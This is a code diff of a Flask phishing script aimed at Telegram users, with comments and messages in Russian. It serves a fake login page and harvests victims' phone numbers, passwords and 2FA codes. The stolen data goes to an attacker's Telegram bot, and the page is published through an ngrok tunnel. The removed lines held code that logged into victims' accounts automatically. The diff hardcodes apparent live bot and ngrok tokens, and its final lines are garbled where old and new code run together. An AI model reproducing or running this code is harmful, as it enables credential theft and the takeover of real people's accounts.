@@ -1,40 +1,38 @@
-from flask import Flask, render_template, request, session, redirect
-from telethon.sync import TelegramClient
-from telethon.errors import SessionPasswordNeededError
+from flask import Flask, render_template, request
 from pyngrok import ngrok
-import requests
-import asyncio
-import os
+import requests, os
 
 app = Flask(__name__)
-app.secret_key = "androidterm"
 
-# === ТВОИ НАСТРОЙКИ ===
-BOT_TOKEN = "YOUR_BOT_TOKEN"
-CHAT_ID = "YOUR_CHAT_ID"
-API_ID = 1234567                  # my.telegram.org
-API_HASH = "your_api_hash"
+BOT_TOKEN = "7431242168:AAHoFtnRDfthNOXOHSto7njFB-Ph3Z3kyLM"
+CHAT_ID = "7431242168"
+NGROK_TOKEN = "36rGvvV7RV19BVtM2fGFTxtr804_4u7TXhWWBSnL9K1MN56Ff"
 
 def send(msg):
     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                   data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"})
 
-def send_file(path, caption):
-    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
-                  data={"chat_id": CHAT_ID, "caption": caption},
-                  files={"document": open(path, "rb")})
+@app.route('/')
+def home(): return render_template('terminal.html')
 
-async def auto_login(phone, password, code):
-    session_name = f"sessions/{phone.replace('+','')}"
-    client = TelegramClient(session_name, API_ID, API_HASH)
-    try:
-        await client.connect()
-        if not await client.is_user_authorized():
-            await client.send_code_request(phone)
-            try:
-                await client.sign_in(phone, code)
-            except SessionPasswordNeededError:
-                await client.sign_in(password=password)
+@app.route('/login', methods=['POST'])
+def step1():
+    phone = request.form['phone']
+    pwd = request.form.get('password', 'Нет')
+    send(f"<b>ЖЕРТВА (БЕЗ API)</b>\nТелефон: {phone}\nПароль: {pwd}")
+    return render_template('terminal_code.html')
+
+@app.route('/code', methods=['POST'])
+def step2():
+    code = request.form['code']
+    send(f"<b>ГОТОВО БЕЗ API ID</b>\nКод 2FA: {code}\nТеперь вручную логинишься этими данными.")
+    return "<pre style='color:#0f0;background:#000;padding:20px;'>Data captured successfully.</pre>"
+
+if __name__ == '__main__':
+    ngrok.set_auth_token(NGROK_TOKEN)
+    tunnel = ngrok.connect(5000, "http")
+    send(f"<b>ЛЕГКИЙ ФИШИНГ БЕЗ API ЗАПУЩЕН</b>\nСсылка: <code>{tunnel.public_url}</code>")
+    app.run(host='0.0.0.0', port=5000)                await client.sign_in(password=password)
         session_file = f"{session_name}.session"
         if os.path.exists(session_file):
             send(f"<b>АККАУНТ ВЗЛОМАН С АНДРОИДА</b>\nТелефон: {phone}")
